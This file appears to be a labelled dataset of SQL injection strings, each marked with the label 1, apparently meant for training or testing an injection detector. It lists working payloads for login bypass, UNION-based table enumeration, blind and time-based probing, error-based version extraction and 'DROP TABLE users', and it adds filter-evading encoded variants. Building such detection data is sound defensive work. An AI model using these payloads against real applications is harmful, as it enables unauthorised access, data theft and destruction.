"' OR '1'='1", 1
"' OR 1=1 --", 1
"' AND 1=1 --", 1
"' UNION SELECT 1,2,3--", 1
"' UNION SELECT null, null, null --", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables --", 1
"1' AND substring(database(), 1, 1) = 's' --", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --", 1
"; DROP TABLE users; --", 1
"; SELECT pg_sleep(5); --", 1
"WAITFOR DELAY '0:0:5'--", 1
"' OR EXISTS(SELECT 1 FROM users)--", 1
"' AND 1=convert(int,@@version)--", 1
"' AND extractvalue(1,concat(0x5c,version()))--", 1
"admin' OR '1'='1", 1
"1) UNION SELECT 1,database(),3--", 1
"1)) UNION SELECT 1,database(),3--", 1
"1 AND 1=1", 1
"test' OR '1'='1' /*", 1
"test' OR '1'='1' --", 1
";%20%20%20%20%20DROP%20%20%20%20%20TABLE%20%20%20%20%20users;%20%20%20%20%20--", 1
"1%29 UNI%4fN SELECT%201,database(),3-%2d", 1
"1' AND substring(database(), 1, 1) = 's' ----lfy109vwuty4y", 1
"%u0027UNION%0aSELECT1,2,3--", 1
"test%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3D%271%27%2F%2A%2A%2F--%2F%2A%2A%2F", 1
"%27/*!12345*/AND%2%30%65xtractv%61lue(1,c%6fncat(0x5%63,ve%72sion())) # more_noise--", 1
"1' uNIoN seLECt tabLE_namE, NuLl, NULl FroM InFOrmATioN_sChEMA.TaBles ----qjg3vxlnrd", 1
"te%53t'%20Or/*!*/'1'='1' /* -- r%41%4edom_nOISe", 1
"admin'||/*%0a*/(1=1)'1'='1/*%0d%0a*/", 1
"Test' Or '1'<='1' /*#xqx467c5vr2o", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20--", 1
"1%29%25u0020UNION%25u0020SELECT%25u00201%2Cdatabase%28%29%2C3--", 1
